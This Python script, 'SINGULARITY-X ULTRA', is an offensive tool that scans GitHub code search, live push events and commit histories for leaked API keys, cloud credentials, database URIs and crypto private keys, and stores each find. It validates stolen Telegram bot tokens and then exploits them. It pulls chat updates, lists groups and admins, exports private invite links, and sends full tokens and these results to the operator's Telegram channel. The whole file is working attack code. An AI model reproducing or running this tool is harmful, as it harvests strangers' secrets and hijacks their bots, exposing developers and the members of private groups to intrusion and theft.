#!/usr/bin/env python3
"""
SINGULARITY-X ULTRA v3.0 - ULTIMATE EDITION
Fixed, Optimized & Enhanced for Maximum Performance
Live Hit Notifications | Better Error Handling | Stable Telegram Integration
"""

import asyncio
import aiohttp
import re
import base64
import random
import json
import sqlite3
import hashlib
import time
import os
import sys
from datetime import datetime
from urllib.parse import quote, urlparse
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from aiolimiter import AsyncLimiter
from dataclasses import dataclass
from typing import List, Dict, Set, Optional, Tuple
import threading
import queue

# Try to import config
try:
    from config import Config
except ImportError:
    print("""[!] Config not found! Create config.py:

class Config:
    API_ID = 12345
    API_HASH = "your_api_hash"
    BOT_TOKEN = "your_bot_token"
    LOG_CHAT = -1001234567890  # Your log group/channel ID
    GH_TOKENS = ["ghp_token1", "ghp_token2"]
""")
    sys.exit(1)

# =============================================================================
# CONFIGURATION
# =============================================================================

@dataclass
class ScanConfig:
    REQUESTS_PER_SECOND: int = 3000
    MAX_RETRIES: int = 5
    RETRY_DELAY: float = 2.0
    MAX_CONCURRENT: int = 300
    BATCH_SIZE: int = 50
    DEEP_BLAME_DEPTH: int = 30
    MAX_FILE_SIZE_MB: int = 5
    LIVE_NOTIFICATIONS: bool = True
    NOTIFICATION_COOLDOWN: int = 30  # Seconds between duplicate notifications

SCAN_CFG = ScanConfig()

# 50+ Token Patterns
TOKEN_PATTERNS = {
    'telegram_bot': r'[0-9]{8,10}:[a-zA-Z0-9_-]{35,40}',
    'telegram_api_id': r'api_id["\']?\s*[:=]\s*["\']?([0-9]{5,8})',
    'telegram_api_hash': r'api_hash["\']?\s*[:=]\s*["\']?([a-f0-9]{32})',
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret': r'["\']?(aws|secret)["\']?\s*[:=]\s*["\']?[a-zA-Z0-9/+=]{40}',
    'aws_mws': r'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
    'google_api': r'AIza[0-9A-Za-z_-]{35}',
    'google_oauth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    'azure_key': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
    'heroku_api': r'[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}',
    'slack_token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}',
    'slack_webhook': r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8,}/[a-zA-Z0-9_]{24}',
    'discord_token': r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
    'discord_webhook': r'https://discord\.com/api/webhooks/[0-9]{18,20}/[a-zA-Z0-9_-]{68}',
    'twilio_sid': r'SK[0-9a-f]{32}',
    'stripe_key': r'sk_live_[0-9a-zA-Z]{24}',
    'stripe_test': r'sk_test_[0-9a-zA-Z]{24}',
    'paypal_key': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
    'bitcoin_wif': r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}',
    'ethereum_private': r'0x[a-fA-F0-9]{64}',
    'generic_api_key': r'[aA][pP][iI]_?[kK][eE][yY]["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_-]{32,64}',
    'generic_secret': r'[sS][eE][cC][rR][eE][tT]["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_-]{16,64}',
    'bearer_token': r'bearer\s+[a-zA-Z0-9_\-\.=]{20,100}',
    'jwt_token': r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
    'mysql_conn': r'mysql://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'postgres_conn': r'postgres(ql)?://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'mongodb_conn': r'mongodb(\+srv)?://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'redis_conn': r'redis://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'ssh_private': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
    'password_in_code': r'(?i)(password|passwd|pwd)\s*[=:]\s*["\'][^"\']{4,50}["\']',
}

EXTENSIONS = ['env', 'php', 'js', 'json', 'yml', 'yaml', 'py', 'sh', 'sql', 'ini', 'conf', 
              'bak', 'txt', 'log', 'config', 'properties', 'xml', 'toml', 'tf', 'tfvars',
              'pem', 'key', 'p12', 'pfx', 'htaccess', 'htpasswd', 'local', 'secret']

KEYWORDS = ['bot_token', 'api_key', 'api_secret', 'secret_key', 'private_key', 'password',
            'aws_access_key', 'github_token', 'stripe_key', 'mongodb_uri', 'connection_string']

GITHUB_DORKS = [
    'extension:env DB_PASSWORD', 'extension:env DATABASE_URL', 'extension:yml password',
    'extension:json api_key', 'extension:py BOT_TOKEN', 'extension:js password',
    'filename:.htpasswd', 'filename:id_rsa', 'filename:.p12', 'path:.env',
    'extension:log password', 'extension:tfvars',
]

# Global State
PROCESSED_TOKENS: Set[str] = set()
PROCESSED_URLS: Set[str] = set()
NOTIFICATION_CACHE: Dict[str, float] = {}
STATS = {
    'requests': 0, 'tokens_found': 0, 'valid_tokens': 0, 
    'errors': 0, 'start_time': time.time(), 'hits_sent': 0
}

# Message Queue for Live Notifications
message_queue = queue.Queue()

# =============================================================================
# DATABASE
# =============================================================================

class TokenDatabase:
    def __init__(self, db_path="singularity_intel.db"):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS tokens (
            token_hash TEXT PRIMARY KEY, token_type TEXT, raw_token TEXT,
            source_url TEXT, source_method TEXT, found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            validated INTEGER DEFAULT 0, bot_username TEXT, bot_id TEXT,
            severity TEXT DEFAULT 'unknown')''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS groups (
            id INTEGER PRIMARY KEY, token_hash TEXT, chat_id TEXT, chat_type TEXT,
            title TEXT, invite_link TEXT, member_count INTEGER,
            discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY, token_hash TEXT, bot_username TEXT,
            groups_count INTEGER, invite_links TEXT, hit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        conn.commit()
        conn.close()
    
    def insert_token(self, token: str, token_type: str, source: str, method: str) -> bool:
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        try:
            c.execute('INSERT INTO tokens (token_hash, token_type, raw_token, source_url, source_method) VALUES (?, ?, ?, ?, ?)',
                     (token_hash, token_type, token, source, method))
            conn.commit()
            conn.close()
            return True
        except sqlite3.IntegrityError:
            conn.close()
            return False
    
    def update_validation(self, token: str, valid: bool, bot_data: dict):
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('UPDATE tokens SET validated=?, bot_username=?, bot_id=?, severity=? WHERE token_hash=?',
                 (1 if valid else 0, bot_data.get('username'), str(bot_data.get('id')), 
                  'critical' if valid else 'invalid', token_hash))
        conn.commit()
        conn.close()
    
    def insert_group(self, token: str, chat_id: str, chat_type: str, title: str, invite_link: str = None, member_count: int = 0):
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO groups (token_hash, chat_id, chat_type, title, invite_link, member_count) VALUES (?, ?, ?, ?, ?, ?)',
                 (token_hash, chat_id, chat_type, title, invite_link, member_count))
        conn.commit()
        conn.close()
    
    def record_hit(self, token: str, bot_username: str, groups_count: int, invite_links: List[str]):
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('INSERT INTO hits (token_hash, bot_username, groups_count, invite_links) VALUES (?, ?, ?, ?)',
                 (token_hash, bot_username, groups_count, json.dumps(invite_links)))
        conn.commit()
        conn.close()
    
    def get_stats(self) -> dict:
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        stats = {}
        for table in ['tokens', 'groups', 'hits']:
            c.execute(f'SELECT COUNT(*) FROM {table}')
            stats[table] = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM tokens WHERE validated=1')
        stats['valid'] = c.fetchone()[0]
        conn.close()
        return stats

db = TokenDatabase()

# =============================================================================
# TELEGRAM NOTIFICATION HANDLER
# =============================================================================

class NotificationManager:
    def __init__(self):
        self.client = None
        self.is_connected = False
        self.last_hit_time = 0
    
    async def initialize(self):
        """Initialize Telegram client"""
        try:
            self.client = TelegramClient('singularity_session', Config.API_ID, Config.API_HASH)
            await self.client.start(bot_token=Config.BOT_TOKEN)
            self.is_connected = True
            me = await self.client.get_me()
            print(f"[✓] Telegram Bot Connected: @{me.username}")
            return True
        except Exception as e:
            print(f"[✗] Telegram connection failed: {e}")
            return False
    
    async def send_hit_notification(self, token: str, bot_data: dict, intelligence: dict, source: str, method: str):
        """Send LIVE hit notification immediately"""
        if not self.is_connected:
            return
        
        # Cooldown check
        current_time = time.time()
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:16]
        last_notified = NOTIFICATION_CACHE.get(token_hash, 0)
        
        if current_time - last_notified < SCAN_CFG.NOTIFICATION_COOLDOWN:
            return
        
        NOTIFICATION_CACHE[token_hash] = current_time
        STATS['hits_sent'] += 1
        self.last_hit_time = current_time
        
        # Build live hit message
        groups = intelligence.get('groups', [])
        invite_count = len([g for g in groups if g.get('invite_link')])
        
        live_msg = f"""
🔥 **LIVE HIT DETECTED!** 🔥

👤 **Bot:** @{bot_data.get('username', 'N/A')}
🆔 **ID:** `{bot_data.get('id', 'N/A')}`
🏰 **Groups Found:** {len(groups)}
🔗 **Invites Extracted:** {invite_count}

🔑 **Token:**
`{token[:20]}...{token[-10:]}`

🔗 **Source:**
Method: `{method}`
URL: {source}

⚠️ **Capabilities:**
• Can Join Groups: {'✅' if bot_data.get('can_join_groups') else '❌'}
• Read All Messages: {'🔴 YES' if bot_data.get('can_read_all_group_messages') else '❌'}
• Inline Queries: {'✅' if bot_data.get('supports_inline_queries') else '❌'}

⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        try:
            await self.client.send_message(Config.LOG_CHAT, live_msg)
            print(f"[🔔] LIVE HIT sent to log group: @{bot_data.get('username')}")
        except Exception as e:
            print(f"[✗] Failed to send notification: {e}")
    
    async def send_detailed_report(self, token: str, bot_data: dict, intelligence: dict, source: str, method: str):
        """Send detailed report as follow-up"""
        if not self.is_connected:
            return
        
        groups = intelligence.get('groups', [])
        
        # Build detailed report
        report_lines = [
            "═" * 50,
            "📋 DETAILED INTELLIGENCE REPORT",
            "═" * 50,
            f"\n🔑 Full Token:\n`{token}`",
            f"\n🏰 Groups/Channels ({len(groups)}):"
        ]
        
        for i, group in enumerate(groups[:10], 1):  # Show first 10
            report_lines.append(f"\n{i}. {group.get('title', 'N/A')} ({group.get('type', 'N/A')})")
            report_lines.append(f"   ID: `{group.get('chat_id')}`")
            report_lines.append(f"   Members: {group.get('member_count', 0)}")
            if group.get('invite_link'):
                report_lines.append(f"   🔗 {group.get('invite_link')}")
            if group.get('admins'):
                admin_names = [f"@{a.get('username', 'N/A')}" for a in group['admins'][:3]]
                report_lines.append(f"   👥 Admins: {', '.join(admin_names)}")
        
        if len(groups) > 10:
            report_lines.append(f"\n... and {len(groups) - 10} more groups")
        
        report_lines.append("\n" + "═" * 50)
        
        full_report = "\n".join(report_lines)
        
        # Send in chunks if too long
        try:
            if len(full_report) > 4000:
                chunks = [full_report[i:i+4000] for i in range(0, len(full_report), 4000)]
                for chunk in chunks:
                    await self.client.send_message(Config.LOG_CHAT, chunk)
                    await asyncio.sleep(0.5)
            else:
                await self.client.send_message(Config.LOG_CHAT, full_report)
        except Exception as e:
            print(f"[✗] Failed to send detailed report: {e}")
    
    async def send_stats_update(self):
        """Send periodic stats update"""
        if not self.is_connected:
            return
        
        runtime = time.time() - STATS['start_time']
        db_stats = db.get_stats()
        
        stats_msg = f"""
📊 **SINGULARITY-X STATUS UPDATE**

⏱️ Runtime: {int(runtime/60)}m {int(runtime%60)}s

📈 Session Stats:
  Requests: {STATS['requests']:,}
  Tokens Found: {STATS['tokens_found']:,}
  Valid Tokens: {STATS['valid_tokens']:,}
  Live Hits Sent: {STATS['hits_sent']:,}
  Errors: {STATS['errors']:,}

💾 Database:
  Total Tokens: {db_stats.get('tokens', 0):,}
  Validated: {db_stats.get('valid', 0):,}
  Groups: {db_stats.get('groups', 0):,}
  Total Hits: {db_stats.get('hits', 0):,}

⚡ Status: ACTIVE
"""
        try:
            await self.client.send_message(Config.LOG_CHAT, stats_msg)
        except Exception as e:
            print(f"[✗] Stats update failed: {e}")

notifier = NotificationManager()

# =============================================================================
# TELEGRAM EXPLOITER
# =============================================================================

class TelegramExploiter:
    async def validate_token(self, session: aiohttp.ClientSession, token: str) -> Tuple[bool, dict]:
        try:
            async with limiter:
                async with session.get(f"https://api.telegram.org/bot{token}/getMe", timeout=aiohttp.ClientTimeout(total=10)) as r:
                    STATS['requests'] += 1
                    if r.status == 200:
                        data = await r.json()
                        return data.get('ok', False), data
                    return False, {}
        except Exception as e:
            return False, {'error': str(e)}
    
    async def get_updates(self, session: aiohttp.ClientSession, token: str, limit: int = 100) -> dict:
        try:
            async with limiter:
                async with session.get(f"https://api.telegram.org/bot{token}/getUpdates?limit={limit}", timeout=aiohttp.ClientTimeout(total=15)) as r:
                    STATS['requests'] += 1
                    if r.status == 200:
                        return await r.json()
                    return {}
        except:
            return {}
    
    async def get_chat_info(self, session: aiohttp.ClientSession, token: str, chat_id) -> dict:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/getChat?chat_id={chat_id}", timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    return await r.json()
                return {}
        except:
            return {}
    
    async def get_chat_admins(self, session: aiohttp.ClientSession, token: str, chat_id) -> list:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/getChatAdministrators?chat_id={chat_id}", timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result', [])
                return []
        except:
            return []
    
    async def get_member_count(self, session: aiohttp.ClientSession, token: str, chat_id) -> int:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/getChatMemberCount?chat_id={chat_id}", timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result', 0)
                return 0
        except:
            return 0
    
    async def export_invite_link(self, session: aiohttp.ClientSession, token: str, chat_id) -> Optional[str]:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={chat_id}", timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result')
                return None
        except:
            return None
    
    async def exploit_bot(self, session: aiohttp.ClientSession, token: str, source: str, method: str) -> Optional[dict]:
        global PROCESSED_TOKENS
        
        if token in PROCESSED_TOKENS:
            return None
        PROCESSED_TOKENS.add(token)
        
        # Check DB
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        conn = sqlite3.connect(db.db_path)
        c = conn.cursor()
        c.execute('SELECT validated FROM tokens WHERE token_hash=?', (token_hash,))
        existing = c.fetchone()
        conn.close()
        
        if existing and existing[0]:
            return None
        
        # Validate
        is_valid, bot_info = await self.validate_token(session, token)
        
        if not is_valid:
            db.insert_token(token, 'telegram_bot', source, method)
            db.update_validation(token, False, {})
            return None
        
        # VALID BOT FOUND!
        STATS['valid_tokens'] += 1
        bot_data = bot_info.get('result', {})
        bot_username = bot_data.get('username', 'unknown')
        bot_id = bot_data.get('id', 0)
        
        print(f"\n[🔥🔥🔥] VALID BOT FOUND: @{bot_username} (ID: {bot_id})")
        
        # Store in DB
        db.insert_token(token, 'telegram_bot', source, method)
        db.update_validation(token, True, bot_data)
        
        # Gather Intelligence
        intelligence = {'bot_id': bot_id, 'bot_username': bot_username, 'groups': [], 'invite_links': []}
        
        updates = await self.get_updates(session, token, limit=100)
        processed_chats = set()
        
        if updates.get('ok'):
            for update in updates.get('result', []):
                if 'message' in update:
                    msg = update['message']
                    chat = msg.get('chat', {})
                    chat_id = chat.get('id')
                    
                    if chat_id and chat_id not in processed_chats:
                        processed_chats.add(chat_id)
                        chat_type = chat.get('type', 'unknown')
                        chat_title = chat.get('title') or chat.get('username') or f"Private_{chat_id}"
                        
                        chat_info = await self.get_chat_info(session, token, chat_id)
                        member_count = await self.get_member_count(session, token, chat_id)
                        invite_link = await self.export_invite_link(session, token, chat_id)
                        
                        admins = []
                        if chat_type in ['group', 'supergroup', 'channel']:
                            admin_list = await self.get_chat_admins(session, token, chat_id)
                            for admin in admin_list:
                                user = admin.get('user', {})
                                admins.append({'username': user.get('username'), 'status': admin.get('status')})
                        
                        group_data = {
                            'chat_id': chat_id, 'type': chat_type, 'title': chat_title,
                            'invite_link': invite_link, 'member_count': member_count,
                            'admins': admins, 'description': chat_info.get('result', {}).get('description', '')
                        }
                        
                        intelligence['groups'].append(group_data)
                        db.insert_group(token, str(chat_id), chat_type, chat_title, invite_link, member_count)
                        
                        if invite_link:
                            intelligence['invite_links'].append(invite_link)
        
        # Record hit in DB
        db.record_hit(token, bot_username, len(intelligence['groups']), intelligence['invite_links'])
        
        # SEND LIVE NOTIFICATIONS
        if SCAN_CFG.LIVE_NOTIFICATIONS:
            await notifier.send_hit_notification(token, bot_data, intelligence, source, method)
            await asyncio.sleep(1)
            await notifier.send_detailed_report(token, bot_data, intelligence, source, method)
        
        # Save to file
        await self._save_report(token_hash, token, bot_data, intelligence, source, method)
        
        return intelligence
    
    async def _save_report(self, token_hash: str, token: str, bot_data: dict, intel: dict, source: str, method: str):
        try:
            os.makedirs('reports', exist_ok=True)
            filename = f"reports/{bot_data.get('username', 'unknown')}_{int(time.time())}.json"
            
            report_data = {
                'timestamp': datetime.now().isoformat(),
                'token': token,
                'bot': bot_data,
                'intelligence': intel,
                'source': source,
                'method': method
            }
            
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"[💾] Report saved: {filename}")
        except Exception as e:
            print(f"[✗] Save report failed: {e}")

exploiter = TelegramExploiter()

# =============================================================================
# GITHUB SCANNER
# =============================================================================

class GitHubScanner:
    def __init__(self):
        self.token_index = 0
        self.failed_tokens = set()
    
    def get_token(self) -> str:
        tokens = [t for t in Config.GH_TOKENS if t not in self.failed_tokens]
        if not tokens:
            self.failed_tokens.clear()
            tokens = Config.GH_TOKENS
        token = tokens[self.token_index % len(tokens)]
        self.token_index += 1
        return token.strip()
    
    async def request(self, session: aiohttp.ClientSession, url: str, retries: int = 0) -> Tuple[int, dict]:
        if retries >= SCAN_CFG.MAX_RETRIES:
            return 0, {}
        
        token = self.get_token()
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Singularity-X/3.0"
        }
        
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as r:
                STATS['requests'] += 1
                
                if r.status == 401:
                    self.failed_tokens.add(token)
                    return await self.request(session, url, retries + 1)
                
                if r.status == 403:
                    reset_time = int(r.headers.get('X-RateLimit-Reset', 0))
                    wait = max(reset_time - time.time(), 60) if reset_time > time.time() else 60
                    print(f"[⏱️] Rate limited, waiting {wait:.0f}s...")
                    await asyncio.sleep(min(wait, 120))
                    return await self.request(session, url, retries + 1)
                
                if r.status == 200:
                    return r.status, await r.json()
                
                return r.status, {}
                
        except asyncio.TimeoutError:
            await asyncio.sleep(SCAN_CFG.RETRY_DELAY * (retries + 1))
            return await self.request(session, url, retries + 1)
        except Exception as e:
            STATS['errors'] += 1
            await asyncio.sleep(SCAN_CFG.RETRY_DELAY)
            return await self.request(session, url, retries + 1)
    
    async def search_code(self, session: aiohttp.ClientSession, query: str) -> List[dict]:
        results = []
        for page in range(1, 6):
            url = f"https://api.github.com/search/code?q={quote(query)}&sort=indexed&order=desc&per_page=100&page={page}"
            status, data = await self.request(session, url)
            if status == 200:
                items = data.get('items', [])
                if not items:
                    break
                results.extend(items)
            else:
                break
        return results
    
    async def get_events(self, session: aiohttp.ClientSession) -> List[dict]:
        url = "https://api.github.com/events"
        status, data = await self.request(session, url)
        return data if status == 200 else []
    
    async def get_commit(self, session: aiohttp.ClientSession, url: str) -> dict:
        status, data = await self.request(session, url)
        return data if status == 200 else {}
    
    async def get_commits_history(self, session: aiohttp.ClientSession, repo: str, path: str) -> List[dict]:
        url = f"https://api.github.com/repos/{repo}/commits?path={quote(path)}&per_page={SCAN_CFG.DEEP_BLAME_DEPTH}"
        status, data = await self.request(session, url)
        return data if status == 200 and isinstance(data, list) else []
    
    async def get_raw_file(self, session: aiohttp.ClientSession, repo: str, sha: str, path: str) -> str:
        url = f"https://raw.githubusercontent.com/{repo}/{sha}/{path}"
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as r:
                return await r.text() if r.status == 200 else ""
        except:
            return ""
    
    async def deep_scan(self, session: aiohttp.ClientSession, item: dict) -> int:
        repo = item.get('repository', {}).get('full_name')
        path = item.get('path')
        html_url = item.get('html_url', '')
        
        if not repo or not path:
            return 0
        
        found = 0
        commits = await self.get_commits_history(session, repo, path)
        
        for commit in commits[:SCAN_CFG.DEEP_BLAME_DEPTH]:
            sha = commit.get('sha')
            if not sha:
                continue
            
            content = await self.get_raw_file(session, repo, sha, path)
            if not content or len(content) > SCAN_CFG.MAX_FILE_SIZE_MB * 1024 * 1024:
                continue
            
            for token_type, pattern in TOKEN_PATTERNS.items():
                matches = set(re.findall(pattern, content))
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if match else ""
                    if not match or len(match) < 10:
                        continue
                    
                    found += 1
                    STATS['tokens_found'] += 1
                    
                    if token_type == 'telegram_bot':
                        await exploiter.exploit_bot(session, match, html_url, f"DEEP_SCAN:{sha[:7]}")
                    else:
                        db.insert_token(match, token_type, html_url, f"DEEP_SCAN:{sha[:7]}")
        
        return found

gh_scanner = GitHubScanner()

# =============================================================================
# SCANNING MODULES
# =============================================================================

# Rate Limiter
limiter = AsyncLimiter(SCAN_CFG.REQUESTS_PER_SECOND, 1)

async def realtime_monitor(session: aiohttp.ClientSession):
    """Monitor real-time GitHub events"""
    print("[🔄] Real-time monitor started")
    while True:
        try:
            events = await gh_scanner.get_events(session)
            tasks = []
            
            for event in events:
                if event.get('type') == 'PushEvent':
                    repo = event.get('repo', {}).get('name', '')
                    for commit in event.get('payload', {}).get('commits', []):
                        tasks.append(process_push_commit(session, commit.get('url', ''), repo))
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            await asyncio.sleep(3)
        except Exception as e:
            print(f"[✗] Real-time error: {e}")
            await asyncio.sleep(5)

async def process_push_commit(session: aiohttp.ClientSession, commit_url: str, repo: str):
    """Process push event commit"""
    if not commit_url:
        return
    
    commit_data = await gh_scanner.get_commit(session, commit_url)
    
    for file in commit_data.get('files', []):
        patch = file.get('patch', '')
        filename = file.get('filename', '')
        
        ext = filename.split('.')[-1] if '.' in filename else ''
        if ext in EXTENSIONS or any(k in filename.lower() for k in KEYWORDS):
            for token_type, pattern in TOKEN_PATTERNS.items():
                matches = set(re.findall(pattern, patch))
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    if token_type == 'telegram_bot':
                        await exploiter.exploit_bot(session, match, f"https://github.com/{repo}", "REALTIME_PUSH")
                    else:
                        db.insert_token(match, token_type, f"https://github.com/{repo}", "REALTIME_PUSH")

async def targeted_search(session: aiohttp.ClientSession):
    """Targeted search with dorks"""
    print("[🔍] Targeted search started")
    
    search_queries = GITHUB_DORKS.copy()
    for ext in EXTENSIONS[:8]:
        for key in KEYWORDS[:5]:
            search_queries.append(f"extension:{ext}+{key}")
    
    while True:
        random.shuffle(search_queries)
        
        for query in search_queries:
            try:
                print(f"[🔍] Searching: {query[:50]}...")
                items = await gh_scanner.search_code(session, query)
                
                if items:
                    print(f"[+] Found {len(items)} results, analyzing...")
                    
                    for i in range(0, len(items), SCAN_CFG.BATCH_SIZE):
                        batch = items[i:i+SCAN_CFG.BATCH_SIZE]
                        tasks = [gh_scanner.deep_scan(session, item) for item in batch]
                        await asyncio.gather(*tasks, return_exceptions=True)
                
                await asyncio.sleep(random.uniform(2, 5))
            except Exception as e:
                print(f"[✗] Search error: {e}")
                await asyncio.sleep(10)
        
        await asyncio.sleep(60)

async def stats_reporter():
    """Send periodic stats"""
    while True:
        await asyncio.sleep(300)  # 5 minutes
        await notifier.send_stats_update()

async def console_printer():
    """Print console updates"""
    while True:
        await asyncio.sleep(60)
        runtime = time.time() - STATS['start_time']
        print(f"\n[📊] Runtime: {int(runtime/60)}m | Requests: {STATS['requests']:,} | "
              f"Tokens: {STATS['tokens_found']:,} | Valid: {STATS['valid_tokens']:,} | "
              f"Hits: {STATS['hits_sent']:,}")

# =============================================================================
# MAIN
# =============================================================================

async def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   💀 SINGULARITY-X ULTRA v3.0 - ULTIMATE EDITION 💀      ║
    ║                                                           ║
    ║   ✓ Fixed & Optimized                                     ║
    ║   ✓ Live Hit Notifications                                ║
    ║   ✓ Better Error Handling                                 ║
    ║   ✓ Stable Telegram Integration                           ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Initialize Telegram
    success = await notifier.initialize()
    if not success:
        print("[!] Warning: Telegram not connected, notifications disabled")
    
    # Send startup message
    if notifier.is_connected:
        await notifier.send_stats_update()
    
    # Create session
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=SCAN_CFG.MAX_CONCURRENT, ssl=False),
        timeout=aiohttp.ClientTimeout(total=300)
    ) as session:
        
        print("[⚡] Starting all scanning modules...")
        
        # Start all tasks
        tasks = [
            asyncio.create_task(realtime_monitor(session)),
            asyncio.create_task(targeted_search(session)),
            asyncio.create_task(stats_reporter()),
            asyncio.create_task(console_printer()),
        ]
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[💀] Shutting down...")
        stats = db.get_stats()
        print(f"[📊] Final Stats: {stats}")
        print(f"[✓] Total runtime: {int((time.time() - STATS['start_time'])/60)} minutes")
    except Exception as e:
        print(f"\n[✗] Fatal error: {e}")
        import traceback
        traceback.print_exc()
